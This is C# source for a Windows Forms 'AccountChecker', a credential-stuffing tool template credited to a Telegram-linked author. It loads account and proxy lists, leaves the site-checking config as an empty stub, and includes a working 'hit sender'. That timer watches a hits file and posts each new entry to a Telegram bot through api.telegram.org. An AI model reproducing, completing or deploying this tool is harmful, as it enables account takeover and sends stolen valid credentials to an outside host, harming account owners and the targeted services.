using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AccountChecker
{
    //Coded By LilToba :)

    //    https://t.me/ghoulblack

    public partial class Main : Form
    {
        //this code for making black title

        [DllImport("DwmApi")] //System.Runtime.InteropServices
        private static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, int[] attrValue, int attrSize);

        protected override void OnHandleCreated(EventArgs e)
        {
            if (DwmSetWindowAttribute(Handle, 19, new[] { 1 }, 4) != 0)
                DwmSetWindowAttribute(Handle, 20, new[] { 1 }, 4);
        }
        public Main()
        {
            InitializeComponent();
        }




        // this code for timer hit sender
        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (File.Exists(this._filePath) && this.data != File.ReadAllText(this._filePath))
                {
                    new WebClient().DownloadString(string.Format("https://api.telegram.org/bot{0}/sendMessage?chat_id={1}&text={2}", botToken.Text, chatId.Text, File.ReadAllText(this._filePath).Remove(0, this.data.Length)));
                    this.data = File.ReadAllText(this._filePath);
                }
            }
            catch (Exception ex)
            {
                File.AppendAllText("error_log.txt", ex.Message + "\r\n");
            }
        }

  

        //this code for starting timer hit sender
        private void start_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(this._filePath))
            {
                MessageBox.Show("Please select file path and retry.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            if (string.IsNullOrEmpty(this.botToken.Text))
            {
                MessageBox.Show("Please enter bot token and retry.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            if (string.IsNullOrEmpty(this.chatId.Text))
            {
                MessageBox.Show("Please enter chat id and retry.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            this.filePath.Enabled = false;
            senderpath.Enabled = false;
            this.botToken.Enabled = false;
            this.chatId.Enabled = false;
            this.checkTime.Enabled = false;
            this.start.Enabled = false;
            if (File.Exists(this._filePath))
            {
                this.data = File.ReadAllText(this._filePath);
            }
            this.timer1.Interval = int.Parse(this.checkTime.Value.ToString()) * 1000;
            this.timer1.Start();
        }



        // this code for opening options form
        private void optionbtn_Click(object sender, EventArgs e)
        {
            Options options = new Options();
            options.Show();
        }


        // this code for opening help form
        private void helpbtn_Click(object sender, EventArgs e)
        {
            Help help = new Help();
            help.Show();
        }


        // this code for load account list
        private void loadAccBtn_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title ="Select Accounts";
            openFileDialog.Filter = "All Files|*.*";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                //Load All Accounts To String
            
            }

        }

        // this code for load proxy list
        private void proxyloadbtn_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Title = "Select proxy";
            openFileDialog.Filter = "All Files|*.*";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                //Load All proxy To String

            }
        }

        //this code for showing account Menu

        private void accmenu_Click(object sender, EventArgs e)
        {
            contextMenuStrip1.Show(Cursor.Position.X, Cursor.Position.Y);
        }

        //this code for showing proxy Menu
        private void proxymenu_Click(object sender, EventArgs e)
        {
            contextMenuStrip2.Show(Cursor.Position.X, Cursor.Position.Y);
        }

        //this code for stopping timer hit sender
        private void stop_Click(object sender, EventArgs e)
        {
            this.filePath.Enabled = true;
            this.senderpath.Enabled = true;
            this.botToken.Enabled = true;
            this.chatId.Enabled = true;
            this.checkTime.Enabled = true;
            this.start.Enabled = true;
            this.timer1.Stop();
        }

        // select path hit sender
        private void senderpath_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "All Files|*.*";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                filePath.Text = openFileDialog.FileName;
                this._filePath = openFileDialog.FileName;
            }
        }

        // opening liltoba page :)
        private void liltoba_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/liltoba");
        }

        // string file path hit sender
        private string _filePath;

        private string data;

        // Put Site Config Here
        public void Config()
        {

        }


        private void StartCheck_Click(object sender, EventArgs e)
        {
            // Starting Config
            Config();
        }
    }
}
